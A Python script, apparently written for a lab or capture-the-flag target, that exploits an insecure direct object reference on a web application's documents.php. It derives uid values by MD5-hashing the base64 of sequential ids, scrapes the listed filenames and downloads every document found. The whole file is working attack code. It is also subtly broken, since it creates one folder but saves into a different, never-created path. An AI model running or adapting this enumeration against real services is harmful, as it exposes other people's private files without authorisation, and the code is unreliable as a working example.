import requests
import os
import re
from typing import List
import base64
from hashlib import md5

base_url = "http://94.237.60.55:37634"
url = "http://94.237.60.55:37634/documents.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": f"{base_url}/documents.php"
}

def scrape_doc_names(data : str):
    filenames = re.findall(r"/documents/([^\"']+)", data)
    return filenames

def request_uids(id : str):
    uid_b64 = base64.b64encode(id.encode())
    uid_b64_md5 = md5(uid_b64).hexdigest()
    data = {"uid": uid_b64_md5}
    response = requests.post(url, data=data)
    return response.text

def download_valid_docs(filenames, id: str):
    for filename in filenames:
        file_url = f"{base_url}/documents/{filename}"
        save_path = f"docs2/{id}/{filename}"
        response= requests.get(file_url, headers=headers)
        if response.status_code == 200:
            with open(save_path, "wb") as file:
                file.write(response.content)
            print(f"[+] Saved: {save_path}")
        else:
            print(f"[-] Failed to download {filename} (Status: {response.status_code})")

def main():
    os.makedirs("docs", exist_ok=True)
    for id in range(1,30):
        valid_docs = scrape_doc_names(request_uids(str(id)))

        if len(valid_docs) > 0:
            download_valid_docs(valid_docs, str(id))

if __name__ == "__main__":
    main()
